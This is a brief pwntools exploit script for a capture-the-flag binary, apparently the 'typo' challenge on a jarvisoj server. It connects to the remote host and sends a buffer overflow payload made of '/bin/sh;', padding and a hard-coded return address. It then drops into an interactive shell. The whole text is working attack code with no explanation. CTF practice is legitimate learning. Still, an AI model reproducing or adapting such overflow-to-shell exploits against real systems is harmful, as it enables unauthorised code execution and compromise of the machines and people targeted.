from pwn import *
context.log_level = 'debug'

cn = remote('pwn2.jarvisoj.com', 9888)
#cn = process('typo')
cn.recv()
cn.sendline('')
cn.recv()
pay = '/bin/sh;'+'a'*(100+4)+p32(0x00021654)
cn.sendline(pay)
cn.interactive()